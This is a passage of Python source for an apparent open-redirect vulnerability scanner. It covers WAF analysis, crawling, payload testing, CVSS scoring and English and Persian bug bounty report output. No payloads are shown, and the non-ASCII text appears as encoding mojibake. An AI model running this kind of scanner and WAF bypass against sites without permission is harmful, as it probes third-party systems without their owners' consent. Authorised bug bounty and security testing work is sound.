**ÿßÿ≥⁄©ŸÜÿ±**: ŸÜÿ≥ÿÆŸá ⁄©ÿßŸÖŸÑ ÿ®ÿß 248 payload ÿßÿÆÿ™ÿµÿßÿµ€å
"""
            
            # Save reports
            with open(f'bug_bounty_report_{i}_english.md', 'w', encoding='utf-8') as f:
                f.write(english_report)
            
            with open(f'bug_bounty_report_{i}_persian.md', 'w', encoding='utf-8') as f:
                f.write(persian_report)
        
        print(f"[REPORTS] Generated {len(self.vulnerabilities)} professional bug bounty reports")
    
    def calculate_cvss(self, vuln: Vulnerability) -> float:
        """Calculate CVSS score"""
        base_score = 5.0
        
        if vuln.context in ['query', 'fragment']:
            base_score += 1.0
        
        if vuln.vulnerability_type == 'dom_based_redirect':
            base_score += 1.5
        
        if vuln.impact == 'HIGH':
            base_score += 1.0
        elif vuln.impact == 'CRITICAL':
            base_score += 2.0
        
        return min(base_score, 10.0)
    
    async def run_complete_scan(self):
        """Run complete ultimate scan"""
        start_time = time.time()
        
        # Clear screen and show banner
        self.clear_screen()
        self.print_ultimate_banner()
        
        print("\\n" + "‚ñà"*100)
        print("‚îå" + "‚îÄ"*98 + "‚îê")
        print("‚îÇ" + " "*30 + "üî• INITIATING ULTIMATE SCAN OPERATION üî•" + " "*26 + "‚îÇ")
        print("‚îî" + "‚îÄ"*98 + "‚îò")
        print("‚ñà"*100)
        
        try:
            # Initialize systems
            await self.init_session()
            self.init_driver()
            
            # Phase 1: Defense analysis
            waf_info = await self.phase1_defense_analysis()
            
            # Phase 2: Reconnaissance
            await self.phase2_quantum_reconnaissance(waf_info)
            
            # Phase 3: Vulnerability testing
            await self.phase3_vulnerability_testing()
            
            # Phase 4: Report generation
            self.phase4_report_generation()
            
            # Final summary
            scan_duration = time.time() - start_time
            
            print("\\n" + "‚ñà"*100)
            print("‚îå" + "‚îÄ"*98 + "‚îê")
            print("‚îÇ" + " "*35 + "üî• MISSION ACCOMPLISHED üî•" + " "*34 + "‚îÇ")
            print("‚îî" + "‚îÄ"*98 + "‚îò")
            
            print(f"\\n[MISSION-SUMMARY] Scan completed in {scan_duration:.2f} seconds")
            print(f"[DISCOVERY] URLs: {len(self.discovered_urls)} | Parameters: {len(self.parameters)}")
            print(f"[ANALYSIS] Redirect params: {len([p for p in self.parameters if p.is_redirect_related])}")
            print(f"[ANALYSIS] Web3 params: {len([p for p in self.parameters if p.source == 'web3'])}")
            print(f"[RESULTS] Vulnerabilities: {len(self.vulnerabilities)}")
            
            if self.vulnerabilities:
                print("\\nüö® [ALERT] VULNERABILITIES DETECTED:")
                for vuln in self.vulnerabilities:
                    print(f"  ‚ñì {vuln.parameter} -> {vuln.payload} [{vuln.impact}]")
            
            print("\\nüìä [OUTPUT-FILES]")
            print("‚îå‚îÄ üìÑ Ultimate Matrix Report: ultimate_matrix_report.html")
            print("‚îú‚îÄ üíæ Complete JSON Data: complete_results.json")
            print("‚îú‚îÄ üìà CSV Analysis: complete_analysis.csv")
            if self.vulnerabilities:
                print("‚îú‚îÄ üìã Bug Bounty Reports: bug_bounty_report_*_english.md")
                print("‚îú‚îÄ üìã Bug Bounty Reports: bug_bounty_report_*_persian.md")
            if self.vulnerabilities and SELENIUM_OK:
                print("‚îî‚îÄ üì∏ PoC Screenshots: screenshots/")
            else:
                print("‚îî‚îÄ üì∏ No screenshots (no vulnerabilities found)")
            
            print("\\n" + "‚ñà"*100)
            print("üéØ [MISSION-STATUS]: OPERATION SUCCESSFUL")
            if self.vulnerabilities:
                print(f"üö® [SECURITY-ALERT]: {len(self.vulnerabilities)} VULNERABILITIES COMPROMISED!")
            else:
                print("‚úÖ [SECURITY-STATUS]: TARGET DEFENSE SYSTEMS OPERATIONAL")
            print("‚ñà"*100)
            
        except Exception as e:
            print(f"üí• [CRITICAL-ERROR] Mission failed: {e}")
            raise
        finally:
            if self.session:
                await self.session.close()
            if self.driver:
                self.driver.quit()


def check_dependencies():
    """Check system dependencies"""
    print("\\n[SYSTEM-CHECK] Verifying complete system dependencies...")
    
    missing = []
    
    try:
        import aiohttp
        print("‚úÖ aiohttp: OPERATIONAL")
        aiohttp_ok = True
    except ImportError:
        missing.append("aiohttp")
        print("‚ùå aiohttp: CRITICAL - MISSING")
        aiohttp_ok = False
    
    if SELENIUM_OK:
        print("‚úÖ selenium: OPERATIONAL (screenshots enabled)")
    else:
        print("‚ö†Ô∏è  selenium: MISSING (screenshots disabled)")
    
    if BS4_OK:
        print("‚úÖ beautifulsoup4: OPERATIONAL (advanced HTML parsing)")
    else:
        print("‚ö†Ô∏è  beautifulsoup4: MISSING (basic regex parsing)")
    
    try:
        from advanced_modules import PayloadArsenal, WAFBypass, Web3Analyzer, JavaScriptAnalyzer
        print("‚úÖ advanced_modules: OPERATIONAL (all advanced features enabled)")
        modules_ok = True
    except ImportError as e:
        print(f"‚ùå advanced_modules: CRITICAL - MISSING ({e})")
        modules_ok = False
    
    return aiohttp_ok and modules_ok


async def main():
    """Main function with complete functionality"""
    parser = argparse.ArgumentParser(description='üî• Ultimate Open Redirect Hunter v3.0 - Complete Edition üî•')
    parser.add_argument('target', nargs='?', help='Target URL to scan')
    parser.add_argument('--depth', type=int, default=3, help='Maximum crawling depth (default: 3)')
    parser.add_argument('--max-pages', type=int, default=100, help='Maximum pages to crawl (default: 100)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose output')
    parser.add_argument('--check-deps', action='store_true', help='Check system dependencies')
    parser.add_argument('--payloads', action='store_true', help='Show payload count')
    
    args = parser.parse_args()
    
    if args.check_deps:
        check_dependencies()
        return
    
    if args.payloads:
        arsenal = PayloadArsenal()
        payloads = arsenal.get_all_payloads()
        print(f"\\nüéØ [PAYLOAD-ARSENAL] Loaded {len(payloads)} custom payloads")
        print("Sample payloads:")
        for i, payload in enumerate(payloads[:10], 1):
            print(f"  {i}. {payload}")
        print(f"  ... and {len(payloads) - 10} more payloads")
        return
    
    if not args.target:
        print("‚ùå [ERROR] Target URL required")
        print("\\nUsage: python3 MAIN_HUNTER.py https://target.com")
        print("\\nOptions:")
        print("  --check-deps    Check system dependencies")
        print("  --payloads      Show payload arsenal")
        print("  --depth N       Set crawling depth")
        print("  --max-pages N   Set maximum pages")
        print("  --verbose       Enable verbose output")
        return
    
    # Normalize URL
    if not args.target.startswith(('http://', 'https://')):
        args.target = f"https://{args.target}"
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Check dependencies
    if not check_dependencies():
        print("\\n‚ùå [SYSTEM-ERROR] Critical dependencies missing")
        print("\\nüì¶ Install missing dependencies:")
        print("pip3 install aiohttp beautifulsoup4 selenium")
        print("\\n‚ö†Ô∏è  Make sure advanced_modules.py is in the same directory")
        return
    
    print(f"\\nüéØ [TARGET-ACQUIRED] {args.target}")
    print(f"‚öôÔ∏è  [CONFIGURATION] Depth: {args.depth} | Max Pages: {args.max_pages}")
    
    # Launch ultimate scanner
    scanner = MainHunter(args.target, args.depth, args.max_pages)
    await scanner.run_complete_scan()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\\nüõë [OPERATION-ABORTED] Mission interrupted by operator")
    except Exception as e:
        print(f"üí• [CRITICAL-SYSTEM-ERROR] {e}")
        import traceback
        traceback.print_exc()